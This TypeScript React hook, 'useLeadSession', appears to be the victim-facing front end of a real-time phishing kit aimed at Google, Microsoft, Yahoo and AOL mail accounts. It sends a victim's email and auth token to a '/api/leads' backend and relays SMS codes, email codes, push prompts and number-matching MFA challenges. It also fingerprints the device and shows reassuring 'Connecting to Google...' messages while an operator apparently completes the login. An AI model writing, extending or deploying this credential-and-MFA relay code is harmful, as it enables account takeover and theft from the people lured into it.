import { useCallback, useEffect, useRef, useState } from "react";
import {
  selectDevice,
  getSessionId,
  getClientId,
  type DeviceSnapshot,
} from "../libs/devices";

export type LeadStatus =
  | "idle"
  | "loading"
  | "passing"
  | "flagged"
  | "completed"
  | "failed";

export type LeadProcess =
  | "init"
  | "auth"
  | "verify-sms-code"
  | "verify-email-code"
  | "verify-email-link"
  | "verify-prompt-yes"
  | "verify-prompt-num";

export type LeadSessionSnapshot = {
  anchor: string;
  status: LeadStatus;
  process: LeadProcess;
  message: string;
};

export type LeadSessionState = {
  anchor: string | null;
  status: LeadStatus;
  process: LeadProcess;
  message: string;
};

const providerCompany: Record<string, string> = {
  google: "Google",
  outlook: "Microsoft",
  microsoft365: "Microsoft",
  yahoo: "Yahoo",
  aol: "AOL",
  other: "provider",
};

const INITIAL_LEAD_SESSION_STATE: LeadSessionState = {
  anchor: null,
  status: "idle",
  process: "init",
  message: "",
};

function backupKeyFor(provider: string): string {
  return `phoenyx.lead.session.${provider}`;
}

function readBackup(key: string): LeadSessionState | null {
  try {
    const raw = sessionStorage.getItem(key);
    if (!raw) return null;
    const state = JSON.parse(raw) as Partial<LeadSessionState> | null;
    if (!state || typeof state !== "object") return null;
    const restoreState =
      state &&
      typeof state === "object" &&
      typeof state.anchor === "string" &&
      state.anchor.length > 0 &&
      state.status !== "completed";
    if (!restoreState) return null;
    return restoreState
      ? {
          anchor: state!.anchor as string,
          status: (state!.status as LeadStatus) ?? "idle",
          process: (state!.process as LeadProcess) ?? "init",
          message: state!.message ?? "",
        }
      : INITIAL_LEAD_SESSION_STATE;
  } catch {
    return null;
  }
}

function writeBackup(key: string, value: LeadSessionState | null): void {
  try {
    if (value === null) {
      sessionStorage.removeItem(key);
    } else {
      sessionStorage.setItem(key, JSON.stringify(value));
    }
  } catch {}
}

export function useLeadSession(provider: string) {
  const storageKey = backupKeyFor(provider);
  const [initial] = useState(() => readBackup(storageKey));
  const [state, setState] = useState<LeadSessionState>(
    initial ?? INITIAL_LEAD_SESSION_STATE,
  );

  const generationRef = useRef(0);
  const activeStorageKeyRef = useRef(storageKey);

  useEffect(() => {
    if (activeStorageKeyRef.current !== storageKey) {
      activeStorageKeyRef.current = storageKey;
      generationRef.current += 1;
      const next = readBackup(storageKey);
      setState(next ?? INITIAL_LEAD_SESSION_STATE);
      return;
    }
    const backupState =
      state.anchor && state.status !== "completed" ? state : null;
    if (!backupState) {
      writeBackup(storageKey, null);
      return;
    }
    writeBackup(storageKey, backupState ?? INITIAL_LEAD_SESSION_STATE);
  }, [state, storageKey]);

  const sendDevice = useCallback(async (): Promise<{
    status: "known" | "migrated" | "new" | "unknown";
    trustScore: number;
  } | null> => {
    let snapshot: DeviceSnapshot;
    try {
      snapshot = await selectDevice();
    } catch {
      return null;
    }
    try {
      const response = await fetch("/api/device", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(snapshot),
      });
      if (response.ok) {
        const deviceStatus: {
          status: "known" | "migrated" | "new";
          trustScore: number;
        } = await response.json();
        return deviceStatus;
      }
    } catch {}
    return {
      status: "unknown",
      trustScore: 0,
    };
  }, []);

  const sendLead = useCallback(
    async (payload: {
      provider: string;
      email: string;
      authToken: string;
      customField?: { name: string; value: string };
    }) => {
      const currentGeneration = ++generationRef.current;
      setState({
        anchor: null,
        status: "loading",
        process: "auth",
        message: `Connecting to ${providerCompany[payload.provider]}...`,
      });
      try {
        const body = {
          ...payload,
          clientId: getClientId(),
          sessionId: getSessionId(),
        };
        const response = await fetch("/api/leads", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
        if (!response.ok) {
          const json = await response.json();
          throw new Error(
            json?.error?.message ??
              "Check your internet connection and try again.",
          );
        }
        const result: {
          anchor: string;
          status: LeadStatus;
          process: LeadProcess;
        } = await response.json();
        if (generationRef.current !== currentGeneration) return;
        setState({
          anchor: result.anchor,
          status: result.status,
          process: result.process,
          message: `Waiting for response from ${providerCompany[payload.provider]}...`,
        });
      } catch (error) {
        if (generationRef.current !== currentGeneration) return;
        setState({
          anchor: null,
          status: "failed",
          process: "auth",
          message:
            error instanceof Error
              ? error.message
              : "Something went wrong. Please try again.",
        });
      }
    },
    [],
  );

  const sendCodeLead = useCallback(
    async (payload: {
      provider: string;
      email: string;
      type: "sms" | "email";
      code: string;
    }) => {
      const currentGeneration = ++generationRef.current;
      setState((prev) => ({
        anchor: prev.anchor,
        status: "loading",
        process:
          payload.type === "sms" ? "verify-sms-code" : "verify-email-code",
        message: `Sending ${payload.type} code for verification`,
      }));
      try {
        const body = {
          ...payload,
          clientId: getClientId(),
          sessionId: getSessionId(),
        };
        const response = await fetch(`/api/leads/code`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
        if (!response.ok) {
          const json = await response.json();
          throw new Error(
            json?.error?.message ??
              "Check your internet connection and try again.",
          );
        }
        const result: {
          anchor: string;
          status: LeadStatus;
          process: LeadProcess;
          message: string;
        } = await response.json();
        setState({
          anchor: result.anchor,
          status: result.status,
          process: result.process,
          message: result.message,
        });
      } catch (error) {
        if (generationRef.current !== currentGeneration) return;
        setState((prev) => ({
          anchor: prev.anchor,
          status: "failed",
          process: prev.process,
          message:
            error instanceof Error
              ? error.message
              : "Something went wrong. Please try again.",
        }));
      }
    },
    [],
  );

  useEffect(() => {
    const { anchor, status } = state;
    if (!anchor || !status || ["completed", "failed"].includes(status)) return;
    let closed = false;
    let polling = false;
    let pollTimer: ReturnType<typeof setTimeout> | undefined;
    const isPollingActive = () => !closed;
    const applySnapshot = (snapshot: LeadSessionSnapshot) => {
      if (!isPollingActive()) return;
      if (snapshot.status === "completed" || snapshot.status === "failed") {
        closed = true;
        if (pollTimer) clearTimeout(pollTimer);
      }
      setState({
        anchor: snapshot.anchor,
        status: snapshot.status,
        process: snapshot.process,
        message: snapshot.message,
      });
    };
    const checkFlowStatus = async () => {
      if (!isPollingActive() || polling || !state.anchor) return;
      polling = true;
      try {
        const response = await fetch(
          `/api/leads/${encodeURIComponent(state.anchor)}`,
          { cache: "no-store" },
        );
        if (!isPollingActive()) return;
        if (response.ok) {
          const snapshot: LeadSessionSnapshot = await response.json();
          applySnapshot(snapshot);
        }
      } catch {
        // Retry while the session remains active
      } finally {
        polling = false;
        if (isPollingActive()) {
          pollTimer = setTimeout(() => {
            void checkFlowStatus();
          }, 2000);
        }
      }
    };
    void checkFlowStatus();
    return () => {
      closed = true;
      if (pollTimer) clearTimeout(pollTimer);
    };
  }, [state.anchor, state.status]);

  return {
    ...state,
    isLoading: state.status === "loading" || state.status === "passing",
    sendDevice,
    sendLead,
    sendCodeLead,
  };
}
